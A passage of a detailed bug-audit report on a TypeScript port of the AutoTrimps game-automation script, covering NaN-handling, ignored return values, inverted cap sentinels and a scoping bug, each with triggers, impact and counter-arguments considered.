**Impact.** DEFAULT PATH, no setting gate — the profile dropdown and Delete button render for every user via initializeAllSettings() → settingsProfileMakeGUI() (settings-defs.ts:3010), and the selection sits on a default option ("Current") from boot. Blast radius is limited to users who have actually saved settings profiles: with 0 saved profiles the splice is a harmless no-op (only the dropdown gets corrupted); with N>=1 it permanently destroys one stored profile that the user did not select, and with N>=3 it destroys one they did not even have selected in the dropdown. Loss is unrecoverable — safeSetItems overwrites the localStorage key in the same call. Secondary corruption: options.remove(index) deletes the "Current"/"Reset to Default"/"Save New..." option from the dropdown for the rest of the page session, desynchronising the dropdown from the store (a listed profile that no longer exists silently no-ops on switch) and putting every later delete off by one. Invisible to the proof net (no native mutator, no test exercises onDeleteProfile — only bundle-text matches in tests/fixtures/), so baseline-zero is no evidence here. Newly live since #72 shipped the GUI revive; #85 predicted this exact regression and the guard never landed.

**Strongest counter-argument considered.** Two, and neither survives. (a) "It's a faithful legacy port, so it's intended behaviour" — the port IS byte-faithful (verified against 226d5a4b and 700b9b50), but the legacy stub at SettingsGUI.js:822 was explicitly marked "will be overwritten if necessary" and the module did overwrite it, so the buggy path was live in legacy as well; a 9-year-old data-loss bug is still a bug, and CLAUDE.md's rule is to filter faithful-to-legacy-INTENDED from genuine defects, which this is not. (b) "The user has to click Delete and then confirm, so it is self-inflicted" — that is exactly what makes it dangerous rather than safe: the confirm dialog names the wrong thing ("delete the Current settings profile"), and the destructive action is the one the user consented to, on a DIFFERENT object than the one named. The weakest part of the original claim is its reachability story for index 2 (the Cancel at :889 sets selectedIndex=0, not 2) and its overbroad "every subsequent delete targets the wrong row"; both are cosmetic to the finding, since index 0 is the boot state and the concrete off-by-one cascade reproduces.

---

### RbuyJobs hands NaN straight to native buyJob() — corrupts game.resources.food.owned and game.jobs.*.owned permanently

`src/modules/jobs.ts:809`

**Sim-visible?** No. RBuyJobsNew defaults to 1, so RworkerRatios() rewrites all three ratio boxes with numeric tiers every tick and no fixture can produce a NaN ratio; 04-u2-radon (the only RbuyJobs fixture) runs mode 1. baseline-zero cannot reach mode 2.

**Trigger.** Universe 2, RBuyJobsNew == 2 ("Manual Worker Ratios"), and any one of RFarmerRatio / RLumberjackRatio / RMinerRatio left blank or non-numeric. settings-engine.ts:466 (`autoSetValue`) writes `parseNum('')` === NaN into `autoTrimpSettings[id].value` with zero validation, and `getPageSetting` returns `parseFloat(NaN)` === NaN. Mode 1 is safe only because RworkerRatios() overwrites the three boxes with numbers every tick; mode 2 never does.

**Actual.** jobs.ts:764 `desiredRatios[i] = mod * parseFloat(getPageSetting('R'+worker+'Ratio'))` → NaN, so `totalFraction` (775) is NaN and every `desiredWorkers[i]` (782) is NaN. NaN then defeats BOTH loop filters: `if (desiredWorkers[i] > 0) continue` (803, fire loop) and `if (desiredWorkers[i] <= 0) continue` (820, buy loop) are both FALSE for NaN, so all four ratioWorkers get `game.global.buyAmt = Math.abs(NaN)` = NaN and a direct `buyJob(...)` call — eight times per tick. Inside the game: canAffordJob's clamp `workspaces < toBuy` is false for NaN so toBuy is never capped; `trimps.owned - trimps.employed - NaN < 0` is false so the affordability guard passes; checkJobItem computes `price = 5 * NaN` = NaN, `food.owned < NaN` is false so it returns true, and on the take=true pass it executes `game.resources[costItem].owned -= NaN`. buyJob then does `game.jobs[what].owned += added` with added === NaN. Food and job counts become NaN and are saved that way.

**Expected.** The U1 twin already has exactly this guard: `safeBuyJob` (jobs.ts:80) opens with `if (!Number.isFinite(amount) ...) return false`. RbuyJobs bypasses safeBuyJob/RsafeBuyJob entirely and calls native buyJob directly, so it needs the same finite-check (or a `Number.isFinite(totalFraction)` bail before the loops).

**Impact.** **Opt-in setting, U2 only, low probability — but catastrophic and irreversible when it fires. Structurally unguarded by the proof net.**

- **Gate:** `RBuyJobsNew` default is **1** ("Auto Worker Ratios"), so the default path is safe — `RworkerRatios()` rewrites all three boxes with numeric tier values every tick (main-loop.ts:512-514). Only mode **2** ("Manual Worker Ratios") leaves the boxes user-owned, and only U2/radon renders them at all (settings-visibility.ts:403-406). The tooltip actively steers users into mode 2 ("Switch **Buy Jobs** to **Manual Worker Ratios** to set it yourself"), so mode 2 is a normal destination, not an exotic one.
- **Additional trigger requirement:** the user must leave one of `RFarmerRatio` / `RLumberjackRatio` / `RMinerRatio` blank or non-numeric (or set all three to 0 with Scientist locked). That is user error — but with zero validation, and the button then renders the ∞ icon, which reads as a deliberate setting rather than an error.
- **Blast radius when triggered:** within ONE tick, `game.resources.food.owned` and all four of `game.jobs.{Farmer,Lumberjack,Miner,Scientist}.owned` become NaN. Unrecoverable in-session (fixing the box afterwards does not undo it), self-perpetuating (AT's own `freeWorkers <= 0` bail is defeated by NaN), and the autosave persists it as `null` — a wipe of the food stockpile and the entire workforce. This is save-destroying, in the same class as the #68-#74 phantom-setting data-loss family.
- **Sim visibility: NONE, by construction.** The corpus pins `"RBuyJobsNew":1`, and only one U2 fixture (`04-u2-radon`) exercises `RbuyJobs` at all. `baseline-zero` cannot reach mode 2, so this region is unguarded by the differential — the existing L1b spy-log in `tests/jobs.actuators.test.ts` is the only net that covers `RbuyJobs`, and it only pins the happy path.
- **Fix shape:** mechanism-only, no balance numbers touched — a `if (!Number.isFinite(totalFraction) || totalFraction <= 0) return` bail after jobs.ts:777, or a `Number.isFinite` check on `desiredWorkers[i]` before each `game.global.buyAmt` write (809/826). Matches the guard the game itself uses at main.js:5117 and the one `safeBuyJob`/`RsafeBuyJob` already have.

**Strongest counter-argument considered.** **It is byte-faithful to the pre-conversion legacy source, so it is an inherited upstream defect rather than a conversion regression — and it requires the user to type something that is not a number into a box whose own tooltip says "Type a number below."**

I verified the faithfulness directly: `git show d283f152:legacy/modules/jobs.js` lines 639-694 are character-for-character the same allocator, the same two `> 0` / `<= 0` filters, and the same bare `buyJob(ratioWorkers[i], true, true)`. So this has shipped in upstream AutoTrimps for years without a reported save-wipe, which is real evidence that the trigger is rare. One can fairly argue garbage-in/garbage-out and that a fix here is a behaviour change to faithful legacy code, not a bug repair.

Two things stop that from refuting the finding. First, "the game would have caught it" is demonstrably false — I checked: the game maintains the `buyAmt`-is-finite invariant at its INPUT (updates.js:5329) and guards this exact `ratio/totalRatio` division in its own allocator (main.js:5117); AT is the component that breaks an invariant the game relies on, and native `buyJob` has no defence because it was never supposed to need one. Second, the project has already ruled that blank boxes are a contemplated state, not user abuse — jobs.ts:63, :80, :201 and :408 all exist specifically to absorb a NaN'd setting. RbuyJobs is the one hole in a wall the codebase otherwise builds deliberately.

Secondary counter: `canAffordJob`'s `if (workspaces <= 0 && !ignoreWorkspaces) return false` could block it. But RbuyJobs already bailed at jobs.ts:591 unless `ceil(min(realMax/2, owned)) - employed > 0`, and `game.workspaces` is `ceil(realMax/2) - employed` ≥ that, so it is positive precisely when the code reaches the loops (2690 in my fixture).

---

### ratiobuy's `toBuy <= canBuy ? toBuy : canBuy` cap inverts under NaN — one blank ratio box makes AT fill every workspace with Farmers and hire zero Lumberjacks/Miners

`src/modules/jobs.ts:289`

**Sim-visible?** No. BuyJobsNew defaults to 1 (Auto), where workerRatios() overwrites the three boxes with numbers before buyJobs runs on every tick of every U1 fixture. Mode 2 is unreachable from any corpus save.

**Trigger.** Universe 1, BuyJobsNew == 2 ("Manual Worker Ratios"), any one of FarmerRatio / LumberjackRatio / MinerRatio blank or non-numeric, colony at >= 90% of realMax (so buyJobs falls past the line-238 return). Same unvalidated-input path as the U2 case.

**Actual.** jobs.ts:157 `totalRatio = farmerRatio + lumberjackRatio + minerRatio` is NaN, so ratiobuy's `toBuy` (287) is NaN. The ternary at 289 is meant to CAP the purchase at the unemployed pool, but `NaN <= canBuy` is false, so it selects `canBuy` — i.e. the cap becomes the purchase order. `amount != 0` passes and safeBuyJob('Farmer', canBuy) hires every unemployed Trimp the workspaces allow. ratiobuy('Miner') and ratiobuy('Lumberjack') then find freeWorkerSlots() === 0 (`result = canAffordJob(...) && freeWorkers > 0` is false on both the direct and the 'Max' retry), so they hire nothing and — because ratiobuy still returns true — the fire-on-failure arms at 303/305 never run either. Net: 100% Farmers, no wood, no metal.

**Expected.** The same NaN is already handled correctly one module over: settings-visibility.ts:50 computes the identical `total = f + l + m` and bails with `if (!Number.isFinite(total) || total <= 0) return ''`. The render gate and the runtime gate are the same invariant expressed twice and they disagree — the allocator needs the same finiteness bail (or the ternary needs `Math.min` semantics that are NaN-safe).

**Impact.** Opt-in setting, U1 only, but catastrophic and permanent once triggered.

Gate: `BuyJobsNew == 2` ("Manual Worker Ratios") — NOT the default (default 1 = Auto, where `workerRatios()` rewrites all three boxes with numbers every tick, jobs.ts:384-386). Plus either (i) any one of FarmerRatio / LumberjackRatio / MinerRatio left blank or non-numeric — `autoSetValue` (settings-engine.ts:453) validates nothing — or (ii) all three set to 0, which needs no invalid input whatsoever (`0/0` = NaN on the same line). Plus the ordinary steady state `trimps.owned >= realMax*0.9 && !breedFire`.

Blast radius for an affected user: on every tick with free workspaces, Farmer absorbs the entire pool (400,000 in one tick in my worked case) and Lumberjack + Miner get exactly zero hires, forever — wood and metal income frozen while housing compounds. It survives reload (`JSON.stringify(NaN)` → `null`, `parseFloat(null)` → NaN), so there is no self-healing; the user must notice the ∞ glyph on a ratio box and retype a number.

Proof-net visibility: none. No corpus fixture selects Manual mode (verified in `scripts/sim/corpus.mjs` and the single `tests/fixtures/at-settings/p18-z2-balance-stall.json`, which is `BuyJobsNew:1`), so `baseline-zero` cannot see this region and its greenness is not evidence about it.

Fix shape (mechanism, not tuning — no game numbers involved): bail early in `buyJobs` on `!Number.isFinite(totalRatio) || totalRatio <= 0`, mirroring settings-visibility.ts:50, and/or give line 289 NaN-safe cap semantics so a non-finite `toBuy` reaches `safeBuyJob`'s existing `Number.isFinite` guard instead of being replaced by the cap. The U2 twin (`RbuyJobs`) should be audited in the same pass — the ternary appears twice in the oracle bundle.

**Strongest counter-argument considered.** Two, and the first is the real one.

**(a) It is inherited, not introduced, and it is garbage-in.** `git log --all -S"toBuy <= canBuy ? toBuy : canBuy"` returns only `d283f152 Phase 0: modernization foundation`, and the string appears twice in the frozen `tests/fixtures/oracle/autotrimps.oracle.user.js` (U1 + the U2 twin). So this is a long-standing legacy defect faithfully carried across the strangler, not a conversion regression — the byte-parity and trace gates were never supposed to catch it. One can argue AT owes nothing to a user who cleared a numeric box in a manual mode whose own tooltip says "uses the three boxes below as you set them." Against that: the codebase states the opposite intent twice (jobs.ts:80's finiteness guard, settings-visibility.ts:50's identical bail), and the failure is silent, permanent across reloads, and severe.

**(b) The claim's severity wording overshoots.** "No wood, no metal" is wrong for an established colony: U1's `buyJobs` never fires Lumberjacks or Miners outside the breedFire arms, so existing income continues — what actually happens is that 100% of every *new* workspace goes to Farmers, so L/M output stops growing while housing keeps compounding, and their share trends to zero. Also, the misconfigured box renders as the ∞ glyph (`autoSetValue`: `NaN > -1` is false, type is `'value'` not `'valueNegative'`, so it takes the infinity branch) and `jobRatioSuffix` drops the "(x%)" suffix from all four Jobs controls — a cue exists. But an ∞ glyph reads as "unlimited", i.e. deliberate, which arguably makes the cue worse than none.

---

### buyMap()'s return value is discarded, so a refused purchase is recorded as a bought map and AT adopts a pre-existing map's id

`src/modules/mapfunctions-amp.ts:555`

**Sim-visible?** No. Every corpus fixture has RAMPraid=false / RdAMPraid=0 / RAMPraidzone=[-1] (checked tests/fixtures/at-settings/*.json and the per-fixture `settings` overrides in scripts/sim/corpus.mjs — only 10-hypo-u2 and 11-portal-u1 override anything, neither touches praiding). maps.ts:1183 additionally requires getPageSetting('RAMPraidzone')[0] > 0, so RAMP()/dRAMP() are never entered. The whole module is structurally invisible to baseline-zero.

**Trigger.** U2 Prestige Raiding active (RAMPraid on, PR: Zone/PR: Raid populated), AT enters map creation at a PR: Zone entry, and game.global.mapsOwnedArray.length >= 100 at that moment. Reaching 100 is a normal consequence of AT's own behaviour: PR: Recycle (RAMPraidrecycle) defaults to false (settings-defs.ts:1728), and RAMPreset() only calls recycleMap when that setting is on — so each raid zone permanently leaks 5 maps. A praid list of ~20 zones (praid every 10 zones is the documented usage pattern) reaches the cap.

**Actual.** AT pre-checks affordability with `updateMapCost(true) <= game.resources.fragments.owned` and then calls `buyMap()` ignoring its return. main.js:6596-6600 shows the 100-map guard sits INSIDE the affordability branch: `if (cost > 0 && owned >= cost){ if (mapsOwnedArray.length >= 100) { message(...); return -2; } ... }` — so AT's pre-check passes, buyMap returns -2, no map is created and no fragments are spent. AT then unconditionally executes `RAMPmapbought5 = true` (556) and `RAMPpMap5 = game.global.mapsOwnedArray[game.global.mapsOwnedArray.length - 1].id` (558) — the id of a map that already existed (a leftover raid map from an earlier zone, or a unique). All five buy blocks (555/567/579/591/603, daily twins 730/742/754/766/778) do this in the same tick, so RAMPpMap1..5 all end up holding the SAME pre-existing id. Lines 621-665 then selectMap()/runMap() that one map five times across five map-chamber entries, recording it into RAMPrepMap1..5. Because the bought flags are true, the 'Failed to Prestige Raid' bail at line 611 never fires and nothing surfaces the failure. Secondary hazard: RAMPreset()'s `recycleMap(getMapIndex(RAMPrepMapN))` (431-455) then passes the same id five times; getMapIndex (main.js:8187-8191) has no fallthrough return, so after the first splice it yields `undefined`, and recycleMap treats `undefined` as 'recycle the map currently being looked at' (main.js:6694-6697).

**Expected.** Capture and act on buyMap()'s return the way every maps.ts callsite does (maps.ts:796-806, 855-865, 1582-1592): on -2, `recycleBelow(true)` and retry, then `recycleMap(lowestMap)` and retry, and only set RAMPmapboughtN / RAMPpMapN when the call returned 1. At minimum, do not set the bought flag or capture an id when buyMap() did not return 1.

**Impact.** **Opt-in, U2-only, and invisible to every gate — but unguarded where it lives.**

Gating: `RAMPraid` is `'boolean'` default **`false`** (settings-defs.ts:1705-1709); `RAMPraidzone` and `RAMPraidraid` are `'multiValue'` default **`[-1]`** (1713-1719). maps.ts:1181 requires `getPageSetting('RAMPraid') == true && RAMPraidzone[0] > 0 && RAMPraidraid[0] > 0`, so `RAMP()` is unreachable out of the box. settings-visibility.ts:582-588 additionally hides the whole group unless `radonon` (U2), and `turnOff("RAMPraidzone"/"RAMPraidraid"/"RAMPraidcell")` unconditionally — those three are edited only through the `RAMPraidmaz` popup. So: a deliberately-configured U2 praiding user only.

Sim/proof-net: **structurally invisible, confirmed.** Only one of the 12 corpus fixtures mentions praiding at all (`p18-z2-balance-stall.json`: `RAMPraid=false`, `RAMPraidzone=[-1]`, `RdAMPraid=0`); `scripts/sim/corpus.mjs` seeds settings for only `10-hypo-u2` and `11-portal-u1`, neither touching praiding. And the one fixture that DOES sit on the 100-map cap, `07-map-cap-u1`, is U1 — where praiding cannot render. `baseline-zero` is not evidence about this code.

Severity when it fires: at 96-99 owned maps the raid silently skips up to 4 of its 5 target levels while `debug()` reports each one "bought" — the user sees a successful raid that acquired a fraction of the prestiges. At >= 100 owned maps nothing is bought at all, the line-611 "Failed to Prestige Raid" warning is suppressed by the always-true bought flags, AT runs one leftover map five times, and the praid state machine can latch with `Rshoulddopraid` stuck true, parking AT in the map chamber until portal. With `PR: Recycle` on it can additionally destroy one map the user did not intend to lose.

Blast radius of a fix: 12 callsites in this file (RAMP 508/555/567/579/591/603, dRAMP 683/730/742/754/766/778), same class as the 9 already filed under #177 for other-praiding.ts. Fix is mechanism-only (capture the return, gate the flag on `== 1`, reuse the existing maps.ts recovery ladder) — no balance numbers involved.

**Strongest counter-argument considered.** **It is byte-faithful to a 2020 upstream bug, not a port regression.** `git show 0428f56d:modules/maps.js` (Zeker0, 2020-03-03) contains the identical `buyMap(); RAMPmapbought5 = true; if (RAMPmapbought5) {…}` at line 1347-1352, and the module header states the #51 split was a "byte-faithful move… NO refactor here". So this is inherited, and per the repo's convention faithful-to-legacy is a real filter.

Why it does not refute: the CLAUDE.md filter is "faithful-to-legacy-**intended**", and the vestigial `if (RAMPmapboughtN)` immediately after the assignment is positive evidence the original author intended a conditional and lost it, not that a no-check buy was the design. More decisively, `maps.ts` — first-party AT code in the same tree — handles `-2` with a full `recycleBelow → retry → recycleMap(lowestMap) → retry` ladder at three sites, and `scripts/sim/make-fixtures.mjs` builds a whole fixture around that ladder. The codebase demonstrably knows `-2` is reachable and recovers from it everywhere except here.

**Second-strongest: the window is narrow and the normal path guards the door.** Reaching `-2` requires the count to be 96-100 at the exact moment a praid zone is entered, and whenever the NORMAL create path hits `-2` first it calls `recycleBelow(true)`, dropping the count well below the cap and resetting the clock. So the aliasing is intermittent (once per ~95 accumulated maps), not every praid. That lowers frequency, not reality — and the praid path itself contributes 5 maps per raid zone with recycling off by default, so it is a major driver of the count it then fails to handle.

**Third: at 96-99 owned maps the raid partially self-heals.** The `number=0` (top-level) map is bought first and succeeds, so `Rgetequips(raidzones)` can drop to 0, clearing `Rshoulddopraid` and letting `RAMPreset` run. In that sub-case the damage is "silently skipped up to 4 of 5 raid levels while logging '4th map bought'", not a stall. The stall needs the count at >= 100 when the praid begins.

---

### Ship Farming never requests the savory-cache map it exists to farm — the map it builds can never satisfy the selector that asked for it, so AT re-buys a map every tick

`src/modules/mapfunctions.ts:1119`

**Sim-visible?** No. `Rshipfarmon` defaults false and no fixture turns it on, so the repeated buyMap/selectMap traffic the differential WOULD record never occurs. The corpus also has no ship-farm configuration to pair zones with levels.

**Trigger.** U2, Worshipper unlocked (world > 50). `Rshipfarmon` = true, an SF row matching the current zone, `Rshipfarmfrag` (SF: Frags) OFF (its shipped default), and SF: Map Level set to either (a) `-1` — the value the setting's own tooltip documents as "one level below world (matches the Map Reducer mastery's loot-equivalent zone)" — or (b) the shipped default, a single `0`.

**Actual.** RshipMap's three level branches are asymmetric. `> 0` (1111) and `== 0` (1115) both call `RminFragMap(selection, shiplevelzones, special)`, which is the ONLY thing that writes `biomeAdvMapsSelect` (Farmlands/Plentiful) and `advSpecialSelect` (`lsc`/`ssc`). The `< 0` branch (1119-1121) writes only `mapLevelInput` and `advExtraLevelSelect` — it never calls RminFragMap, so no biome and no special are set. Path (b) reaches the same end by a different route: the block's gate at 1104 is `getPageSetting('Rshipfarmlevel') != 0`, and for the shipped default `[0]` that is `String([0])` → `"0"` → `0 != 0` → FALSE, so the whole block (including the RminFragMap call) is skipped. The game then creates a map with no `bonus` at all: createMap (.trimps-game/main.js:6018-6021) sets `newMap.bonus` only when `getSpecialModifierSetting() != "0"`. But RselectShip (1619) recomputes `special = highestRadonLevelCleared > 83 ? "lsc" : "ssc"` and requires `mapsOwnedArray[map].bonus == special` in all three of its match loops (1623, 1633, 1642). `undefined == "ssc"` is false, so no owned map ever matches, RselectShip returns "create" on every tick, and maps.ts's create branch buys a fresh map and does not run it — next tick the same thing happens. Fragments drain until `updateMapCost(true) > fragments.owned`, at which point maps.ts:1571 falls back to running the highest owned map, which is not the ship-farm map. Ship Farming works ONLY when SF: Map Level is strictly positive, or when SF: Frags is ON (RfragCheck("ship") at 1051 calls RminFragMap as a side effect and happens to leave the special set).

**Expected.** The `< 0` branch should call `RminFragMap(selection, shiplevelzones, special)` like its two siblings (RhypoMap:1397-1409 is the correct template — all three of its branches call it), and the level-block gate should not skip the whole block for a single-row `0`. The map AT creates must carry the ssc/lsc special that RselectShip demands and that the feature exists to farm — worshippers cost food (.trimps-game/config.js:12096: "Worshippers always cost 25% of the total amount of Food gathered and looted..."), which is exactly what a Savory Cache supplies, and Rshipfarmon's own tooltip says "Requires Large Savory Cache unlocked."

**Impact.** **Opt-in setting, default-off — but broken for effectively everyone who opts in.** Zero impact on the default path and zero on the proof net.

- **Who is unaffected:** every U1 player; every U2 player who leaves `Rshipfarmon` at its `false` default. The subsystem additionally needs `Rshipfarmzone[0] > 0` and `Rshipfarmamount[0] > 0` (both default `[-1]`, `maps.ts:1253`) and `game.jobs.Worshipper.locked == 0` (U2, world > 50), so it is triple-inert out of the box.
- **Who is affected, and how badly:** a U2 player who turns Ship Farming on and leaves **SF: Frags at its shipped OFF default**. That covers *both* the shipped `SF: Map Level` default (a single `0`) and `-1`, the value the setting's own tooltip recommends ("*-1 = one level below world (matches the Map Reducer mastery's loot-equivalent zone)*"). For them the feature never delivers a single Savory Cache: AT buys a fresh cache-less map every tick (verified: 4 buys / 4 ticks in the model, vs 1 buy then RUN in the positive control), burning fragments until `maps.ts:1571` falls back to running the highest owned map — which is one of the junk maps it just minted. Worshipper farming, the entire point of the feature, does not happen. Only a strictly positive `SF: Map Level`, or flipping SF: Frags ON, works.
- **Severity of the fix:** mechanism-only, one line, no balance numbers touched (`RminFragMap(selection, shiplevelzones, special)` in the 1119 branch, matching `RhypoMap:1406`). Not a tuning change.
- **Proof-net visibility: NONE, and the net cannot be cited here.** `tests/fixtures/at-settings/p18-z2-balance-stall.json` — the only settings fixture — carries `"Rshipfarmon":false, "Rshipfarmzone":[-1], "Rshipfarmamount":[-1], "Rshipfarmlevel":[0], "Rshipfarmfrag":false`. No fixture reaches the code, so `baseline-zero` being green is evidence about the corpus, not about this branch. A regression test must construct the state directly.

**Strongest counter-argument considered.** Three, in descending force.

**(a) It is byte-faithful to the legacy original, and the feature is semi-documented as degraded without SF: Frags.** `git show d283f152:legacy/modules/mapfunctions.js:1930-1932` is identical, so this is inherited, not introduced. And `Rshipfarmfrag`'s own tooltip already says *"Without this, Ship Farming can get stuck trying to create a map it can never afford, forever."* Turning SF: Frags ON genuinely repairs it (RfragCheck:427 → RminFragMap sets the special before the `< 0` branch runs), so one could argue the shipped configuration is simply "user hasn't enabled the required companion setting." — **Why it doesn't survive:** the warning names *affordability*, a different mechanism; the repair is an undocumented side effect of a frag-farming helper, not a design; and the three sibling builders all call `RminFragMap` in the same branch, so "faithful" here means "faithfully reproduces an omission," not "faithful to intent." CLAUDE.md's own filter is faithful-to-legacy-*intended* vs genuine defect, and RselectShip demanding a bonus that RshipMap never sets is a self-contradiction inside one feature.

**(b) A map with the right bonus could pre-exist from another source.** `RquestMap:1940-1943` sets `lsc`/`ssc` for quest 10, so a leftover quest map at the matching level would satisfy `RselectShip` incidentally. — **Why it doesn't survive:** that is coincidental, not a code path; it requires a quest-10 map at exactly `world + levelzones` that has not been recycled, and it does not occur in the ordinary ship-farm cycle.

**(c) It is not an infinite hang.** Once fragments drain, `maps.ts:1571-1577` selects the highest owned map and runs it, so AT does not deadlock — it farms a cache-less map instead. — **Why it doesn't survive:** the fragment burn before that fallback is the defect (a fresh map bought every tick until the 100-map cap forces `recycleBelow`), and the fallback map has no Savory Cache, so the feature still delivers none of the food it exists to farm.

---

### The documented "disable" value for the gear caps turns buyWeps/buyArms into total no-ops (opposite of "no cap")

`src/modules/other.ts:65`

**Sim-visible?** No. Sim fixtures run AT defaults (CapEquip2/CapEquiparm = 10) — scripts/sim/corpus.mjs seeds no gear-cap override — and the caller settings are default-off (`trimpsnotdie` false, `SpirePrepGear` false, `carmormagic`/`darmormagic` 0). The Spire path additionally needs world >= IgnoreSpiresUntil (default 200) and the deepest fixture is z62. The bug is a stable no-op, so the differential would see no trace change either way.

**Trigger.** U1 player sets Weapon Level Cap (`CapEquip2`) and/or Armor Level Cap (`CapEquiparm`) to -1 or 0 — the value both tooltips explicitly prescribe ("Disable with -1 or 0"). Then any of the five call sites fires: `buywepsvoid` on a Void map (main-loop.ts:360), a BW raid (main-loop.ts:410/416), `buySpirePrep` (main-loop.ts:385), `helptrimpsnotdie` / "Buy Armor on Death" (main-loop.ts:331), or `armormagic` (main-loop.ts:363).

**Actual.** Every slot is gated on the raw comparison `game.equipment.X.level < getPageSetting('CapEquip2')` (other.ts:65-70) / `< getPageSetting('CapEquiparm')` (other.ts:78-84). With the setting at -1 or 0 that is `level < -1` / `level < 0`, which is false at every level ≥ 0, so the function calls `preBuy()`, sets `game.global.buyAmt`, buys nothing at all, and calls `postBuy()`. "Disable the cap" silently means "never buy".

**Expected.** A cap of <= 0 must mean "no cap", exactly as the sibling implementations already do: `RbuyArms` (same file, other.ts:301) computes `const armourCap = (getPageSetting('Requipcaphealth') <= 0) ? Infinity : getPageSetting('Requipcaphealth')` with a comment stating this precise bug, and `equipment.ts:221-224` gates with `cap > 0 && level >= cap`. The U1 twins never got the #68 fix.

**Impact.** OPT-IN × OPT-IN, but a total and silent failure inside that region — and the UI actively lies about it.

NOT on the default path: CapEquip2/CapEquiparm default to 10 (settings-defs.ts:1057/1061), which is > 0, so a default-configured user is fine.

Affected user: a U1 player who does what the tooltip tells them — sets Weapon/Armor Level Cap to -1 or 0 to "disable" it (or blanks the input, → NaN) — AND has any of these on, all default-off:
  · buywepsvoid "VM Buy Weps" (default false) → main-loop.ts:360
  · SpirePrepGear "Buy Gear in Spire" (default false, also needs world >= IgnoreSpiresUntil, default '200') → main-loop.ts:385 (calls BOTH buyWeps and buyArms)
  · trimpsnotdie "Buy Armor on Death" (default false) → main-loop.ts:331
  · carmormagic / darmormagic "Armor Magic" (multitoggle, default 0) → main-loop.ts:363
  · BWraid / Dailybwraid (default false) → main-loop.ts:410 and :416

For that user each of those features buys exactly ZERO items, forever, with no error — while the settings button renders "Weapon Level Cap: ∞" (settings-visibility.ts:1086, re-rendered every guiLoop tick) and three separate tooltips promise the opposite ("Disable with -1 or 0"; SpirePrepGear "Still respects your max gear level cap"; trimpsnotdie "Continuously tops up armor to your Armor Level Cap").

Severity ceiling: normal gear levelling still works (equipment.ts honours the sentinel correctly), so this is lost *override* behaviour, not lost gear. Call it MEDIUM-LOW by blast radius, HIGH by silence — it is the same class the fork already shipped a fix for once (#68, RbuyArms), and the U1 twins were simply missed.

Zero risk of the proof net catching a regression here either way: no corpus fixture seeds these ids or their callers, and the failure mode is a stable no-op.

**Strongest counter-argument considered.** Two, and the second is genuinely load-bearing.

(a) "Faithful to legacy." The `level < cap` form is verbatim upstream since 2018-06-14 and every AT user has run it for eight years with no bug report. — But this does not survive contact with the fork's own standard: equipment.ts:218-223 reads the SAME setting id and treats cap<=0 as "no cap", and other.ts:293-294 already declares this exact shape a bug when fixing the U2 twin (#68). Two consumers of one id cannot both be honouring intent. And the sentinel text predates the broken code by 18 months.

(b) THE SEVERITY CEILING — this is the real counter. A player at cap=-1 is NOT left gearless. The main U1 gear buyer, autoLevelEquipment → evaluateEquipmentEfficiency (equipment.ts:218-226), reads the same setting and correctly treats -1 as uncapped, so it keeps levelling gear normally. What the player loses is only the four/five *bypass* features whose entire purpose is to defeat autoLevelEquipment's satisficing brake (equipment.ts:486/:504 `!enoughHealthE` / `!enoughDamageE`): VM weapon top-up, Spire prep, armor-on-death, armor-magic, BW-raid weapons. So the honest framing is "a documented sentinel silently kills five opt-in override features", NOT "AT stops buying gear". Anyone writing this up should not overclaim it as a total gear failure.

A third angle I tested and could not make stick: "the value cannot occur." It can. autoSetValue has no clamp, the input popup itself says "Put -1 for Infinite", and the control renders the infinity glyph once you enter it. There is also a secondary vector I could not verify without a real save and therefore do NOT rely on: CapEquip2's factory default was -1 from 2016-12 to 2018-08, and createSetting only applies a default when nothing is stored (settings-engine.ts:200) while serializeSettings round-trips stored keys forever — so a very old install that never touched the control could still hold -1. Plausible; unproven.

---

### C2 Runner's Challenge² flag is module-scoped, so the game never sees it — every C2 Runner portal starts a PLAIN challenge, and the flag then sticks true for the rest of the session

`src/modules/portal.ts:12`

**Sim-visible?** No. `c2runnerstart` defaults to false and is false in the only at-settings fixture (tests/fixtures/at-settings/p18-z2-balance-stall.json), and every doPortal path is behind `game.global.portalActive`, which tests/sim/portal.test.ts:19 documents no corpus save has. The whole portal module is outside the L0 differential except for that one dedicated test.

**Trigger.** c2runnerstart = true, c2runnerportal > 0, c2runnerpercent > 0, portalActive, and at least one Challenge² below the percent threshold (e.g. game.c2.Discipline/(highestLevelCleared+1)*100 < 85). Any auto- or daily-portal that reaches doPortal().

**Actual.** `var challengeSquaredMode: any;` at portal.ts:12 declares a MODULE-LOCAL binding. esbuild emits the whole src bundle as `"use strict"; (() => { ... var challengeSquaredMode; ... })()` (tests/fixtures/src-bundle.golden.js:1 and :11894), so all 11 writes in c2runner() (portal.ts:174,179,184,189,194,199,204,209,214,219,224) and the read at portal.ts:276 hit AT's private var, never `window.challengeSquaredMode` — which is the game's own `var challengeSquaredMode = false` (.trimps-game/main.js:1663). Consequences: (a) the game's flag stays false, so `selectChallenge()` (main.js:1904/1906/1948) builds a NORMAL challenge and `activatePortal()` computes `game.global.runningChallengeSquared = (selectedChallenge) ? challengeSquaredMode : false` = false (main.js:4014) — the user runs plain Size/Discipline/… and earns zero Challenge² bonus; (b) `portalClicked()` resets only the GAME's copy (main.js:1671), so AT's copy is never cleared — after the first C2 pick `c2done` is false forever, which silently kills BOTH the `AutoStartDaily` block (portal.ts:281) and the `else if (portalWindowOpen && challenge && c2done)` fallback that selects HeliumHourChallenge (portal.ts:304).

**Expected.** The write must reach the game's global, as it did pre-conversion. In `legacy/modules/portal.js` (commit d283f152) the statement was a bare `challengeSquaredMode = true;` with NO `var` anywhere in legacy/ (verified: `git show d283f152:legacy/... | grep -c 'var challengeSquaredMode'` = 0 across all 36 legacy files), and scripts/build-userscript.mjs concatenated the legacy files at TOP LEVEL of the userscript with no IIFE and no "use strict" — a sloppy-mode implicit global that resolved to the game's binding. The fix is the documented seam pattern in CLAUDE.md ("Shared top-level vars → globalThis"): drop the module `var` and write `globalThis.challengeSquaredMode = true`, reading it back the same way so `portalClicked()`'s reset is honoured.

**Impact.** OPT-IN SETTING, U1-ONLY, HIGH SEVERITY FOR ANYONE WHO OPTS IN — and effectively unguarded (sim-invisible).

Who is affected: only users who toggle `C2 Runner` (`c2runnerstart`) ON. It is `'boolean', false` by default (settings-defs.ts:696-699) and only renders in Universe 1 (settings-visibility.ts:326-328 gates on `!radonon`). Default-path users see nothing. The 12-save corpus never enables it, so `baseline-zero` is structurally blind here, and the committed oracle bundle carries the same defect — this region has no net at all.

How badly, for those users: the C2 Runner feature is completely non-functional and fails silently.
